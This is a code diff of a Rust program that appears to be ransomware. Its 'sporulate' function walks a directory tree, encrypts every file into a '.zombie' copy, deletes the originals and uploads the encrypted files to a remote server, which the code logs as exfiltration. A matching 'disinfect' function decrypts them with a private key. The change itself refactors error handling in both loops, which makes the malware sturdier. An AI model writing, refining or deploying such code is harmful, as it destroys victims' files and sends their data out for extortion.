@@ -92,6 +92,7 @@ pub async fn sporulate(
     let excluded_files_set: HashSet<&str> = EXCLUDED_FILES.iter().cloned().collect();
 
     let client = Client::new();
+    let mut has_errors = false;
 
     // Create a lazy iterator that traverses the directory tree, filtering out
     // excluded entries and errors.
@@ -134,33 +135,34 @@ pub async fn sporulate(
     for entry in walker {
         let file_path = entry.path();
 
-        debug!("Encrypting file: {:?}", file_path);
-        let zombie = match encrypt(file_path, &public_key) {
-            Ok(z) => z,
-            Err(e) => {
-                error!("Failed to encrypt file {:?}: {}", file_path, e);
-                continue;
+        let process = || async {
+            debug!("Encrypting file: {:?}", file_path);
+            let zombie = encrypt(file_path, &public_key)?;
+
+            if !no_delete {
+                debug!("Deleting original file: {:?}", file_path);
+                fs::remove_file(file_path)?;
             }
+
+            if let Some(address) = server {
+                debug!("Exfiltrating file: {:?}", zombie);
+                upload_file(&client, address, &zombie).await?;
+            }
+            Ok::<(), AppError>(())
         };
 
-        if !no_delete {
-            debug!("Deleting original file: {:?}", file_path);
-            if let Err(e) = fs::remove_file(file_path) {
-                error!("Failed to delete file {:?}: {}", file_path, e);
-                continue;
-            }
+        if let Err(e) = process().await {
+            error!("Failed to process file {:?}: {}", file_path, e);
+            has_errors = true;
         }
-
-        if let Some(address) = server {
-            debug!("Exfiltrating file: {:?}", zombie);
-            if let Err(e) = upload_file(&client, address, &zombie).await {
-                error!("Failed to exfiltrate file {:?}: {}", file_path, e);
-                continue;
-            }
-        };
     }
-    info!("Encryption process completed successfully");
-    Ok(())
+
+    if has_errors {
+        Err(AppError::PartialFailure)
+    } else {
+        info!("Encryption process completed successfully");
+        Ok(())
+    }
 }
 
 /// Traverses a directory tree starting from `path`, looking for `.zombie`
@@ -181,6 +183,8 @@ pub fn disinfect(path: &Path, key: &Path, no_delete: &bool) -> Result<(), AppErr
     let private_key = load_private_key(key)?;
     debug!("Loaded main private key from {:?}", key);
 
+    let mut has_errors = false;
+
     // Create a lazy iterator that finds all `.zombie` files.
     let walker = WalkDir::new(path)
         .into_iter()
@@ -197,22 +201,29 @@ pub fn disinfect(path: &Path, key: &Path, no_delete: &bool) -> Result<(), AppErr
     for entry in walker {
         let file_path = entry.path();
 
-        debug!("Decrypting file: {:?}", file_path);
-        if let Err(e) = decrypt(file_path, &private_key) {
-            error!("Failed to decrypt file {:?}: {}", file_path, e);
-            continue;
+        let process = || -> Result<(), AppError> {
+            debug!("Decrypting file: {:?}", file_path);
+            decrypt(file_path, &private_key)?;
+
+            if !no_delete {
+                debug!("Deleting .zombie file: {:?}", file_path);
+                fs::remove_file(file_path)?;
+            }
+            Ok(())
         };
 
-        if !no_delete {
-            debug!("Deleting .zombie file: {:?}", file_path);
-            if let Err(e) = fs::remove_file(file_path) {
-                error!("Failed to delete file: {:?}: {}", file_path, e)
-            }
+        if let Err(e) = process() {
+            error!("Failed to process file {:?}: {}", file_path, e);
+            has_errors = true;
         }
     }
 
-    info!("Decryption process completed successfully");
-    Ok(())
+    if has_errors {
+        Err(AppError::PartialFailure)
+    } else {
+        info!("Decryption process completed successfully");
+        Ok(())
+    }
 }
 
 /// Generates a Curve25519 key pair and saves the Base64-encoded keys to the
